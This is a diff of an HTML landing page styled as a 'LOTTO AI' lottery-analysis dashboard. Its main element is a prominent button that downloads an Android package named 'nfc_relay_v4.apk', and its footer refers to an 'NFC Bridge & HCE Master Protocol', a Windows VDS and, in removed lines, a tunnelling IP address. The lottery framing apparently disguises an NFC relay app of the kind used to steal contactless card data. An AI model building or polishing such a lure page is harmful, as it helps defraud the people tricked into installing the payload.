@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LOTTO AI | Premium Dashboard v5.5</title>
+    <title>LOTTO AI | Premium Dashboard v6.0</title>
     <style>
         :root {
             --primary: #00ff41; 
@@ -24,36 +24,38 @@
             position: relative;
         }
 
-        /* --- ARKA PLAN KATMANLARI --- */
+        /* --- ARKA PLAN PNG KATMANLARI --- */
         .bg-layer {
             position: absolute;
             z-index: 1;
             pointer-events: none;
-            opacity: 0.15;
-            filter: blur(2px);
+            opacity: 0.12;
+            filter: blur(1px);
         }
-        .png-1 { top: -5%; left: -5%; width: 40%; transform: rotate(-10deg); }
-        .png-2 { bottom: -5%; right: -5%; width: 45%; }
-        .png-3 { top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; opacity: 0.08; }
+        .png-bg-1 { top: -5%; left: -5%; width: 35%; transform: rotate(-12deg); }
+        .png-bg-2 { bottom: -5%; right: -5%; width: 40%; }
+        /* png3 varsa en arkada devasa durur */
+        .png-bg-3 { top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; opacity: 0.05; }
 
-        /* --- ANA PANEL (ORTADA) --- */
+        /* --- ANA PANEL --- */
         .dashboard-container {
-            background: rgba(13, 17, 23, 0.92);
-            border: 1px solid rgba(0, 255, 65, 0.25);
+            background: rgba(13, 17, 23, 0.94);
+            border: 1px solid rgba(0, 255, 65, 0.3);
             border-radius: 25px;
-            padding: 40px;
+            padding: 35px;
             width: 90%;
             max-width: 420px;
             text-align: center;
-            box-shadow: 0 0 60px rgba(0, 255, 65, 0.2);
-            backdrop-filter: blur(20px);
+            box-shadow: 0 0 70px rgba(0, 255, 65, 0.25);
+            backdrop-filter: blur(25px);
             z-index: 10;
             position: relative;
         }
 
+        /* EN ÜSTTEKİ KÜÇÜK LOGO */
         .main-logo {
-            width: 130px;
-            height: 130px;
+            width: 120px;
+            height: 120px;
             border-radius: 50%;
             border: 3px solid var(--primary);
             box-shadow: 0 0 20px var(--primary);
@@ -66,103 +68,113 @@
             color: var(--primary);
             letter-spacing: 2px;
             text-transform: uppercase;
-            margin-bottom: 10px;
+            margin: 0;
         }
 
         .status-badge {
             background: rgba(0, 255, 65, 0.1);
             color: var(--primary);
-            padding: 6px 18px;
+            padding: 5px 15px;
             border-radius: 50px;
-            font-size: 13px;
+            font-size: 12px;
             border: 1px solid var(--primary);
             display: inline-block;
-            margin-bottom: 25px;
+            margin: 15px 0 25px 0;
         }
 
-        /* GÖRSEL 2 (Analiz Grafiği) */
-        .preview-box img {
+        /* ORTADAKİ ANA GÖRSEL (PNG1) */
+        .center-preview {
             width: 100%;
-            border-radius: 12px;
+            overflow: hidden;
+            border-radius: 15px;
             margin-bottom: 30px;
-            border: 1px solid rgba(88, 166, 255, 0.3);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            background: #000;
+        }
+        .center-preview img {
+            width: 100%;
+            display: block;
+            transition: transform 0.5s ease;
+        }
+        .center-preview:hover img {
+            transform: scale(1.05);
         }
 
-        /* APK İNDİRME BUTONU (TAM ORTADA VE BÜYÜK) */
+        /* INDIRME BUTONU */
         .download-btn {
             background: linear-gradient(135deg, #00ff41 0%, #008f11 100%);
             color: #000;
             text-decoration: none;
             display: block;
-            padding: 22px;
+            padding: 20px;
             font-weight: 900;
-            border-radius: 15px;
-            font-size: 20px;
+            border-radius: 12px;
+            font-size: 19px;
             text-transform: uppercase;
             transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
         }
 
         .download-btn:hover {
-            transform: scale(1.05);
+            transform: scale(1.04);
             box-shadow: 0 15px 40px rgba(0, 255, 65, 0.5);
             filter: brightness(1.2);
         }
 
         .footer-info {
-            margin-top: 35px;
+            margin-top: 30px;
             font-size: 11px;
             color: #484f58;
-            line-height: 1.6;
+            line-height: 1.5;
             letter-spacing: 0.5px;
         }
 
-        .blink-dot {
+        .blink {
             height: 8px; width: 8px;
             background-color: var(--primary);
             border-radius: 50%;
             display: inline-block;
             margin-right: 6px;
-            animation: pulse 1.5s infinite;
+            animation: pulse 1.2s infinite;
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.3); opacity: 0.5; }
-            100% { transform: scale(1); opacity: 1; }
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ARKA PLAN GÖRSELLERİ (Dinamik Katman) -->
-    <img src="1.png" class="bg-layer 1" onerror="this.style.display='none'">
-    <img src="2.png" class="bg-layer 2" onerror="this.style.display='none'">
-    <img src="3.png" class="bg-layer 3" onerror="this.style.display='none'">
+    <!-- ARKA PLAN PNG RESİMLERİ -->
+    <img src="1.png" class="bg-layer bg-1" onerror="this.style.display='none'">
+    <img src="2.png" class="bg-layer bg-2" onerror="this.style.display='none'">
+    <img src="3.png" class="bg-layer bg-3" onerror="this.style.display='none'">
 
     <div class="dashboard-container">
-        <!-- 1. RESİM (Logo) -->
-        <img src="l.png" alt="Lotto AI Master" class="main-1" onerror="this.src='https://github.com/identicons/app.png'">
+        <!-- 1. Üst Logo (logo.png) -->
+        <img src="logo.png" alt="Logo" class="main-logo" onerror="this.src='https://github.com/identicons/app.png'">
         
         <h1>LOTTO ANALYSE</h1>
         <div class="status-badge">
-            <span class="blink-dot"></span> SYSTEM: VERSCHLÜSSELT
+            <span class="blink"></span> SİSTEM: AKTİV (.DE)
         </div>
 
-        <!-- 2. RESİM (Analiz Görseli) -->
-        <div class="preview-box">
-            <img src="2.png" alt="Dashboard Preview" onerror="this.style.display='none'">
+        <!-- 2. Ortadaki Ana Görsel (png1.png) -->
+        <div class="center-preview">
+            <img src="1.png" alt="Analyse Unit" onerror="this.style.display='none'">
         </div>
 
-        <!-- APK İNDİRME BUTONU -->
+        <!-- 3. APK İndirme Butonu -->
         <a href="nfc_relay_v4.apk" class="download-btn">
             APK HERUNTERLADEN
         </a>
 
         <div class="footer-info">
-            NFC Bridge & HCE Master Protocol v5.5<br>
-            Secure Tunneling through 216.106.178.54<br>
-            &copy; 2026 Dilyan2121 Cyber Infrastructure
+            NFC Bridge & HCE Master Protocol v6.0<br>
+            Secure Infrastructure // Windows VDS Linked<br>
+            &copy; 2026 Dilyan2121 Master Systems
         </div>
     </div>
 
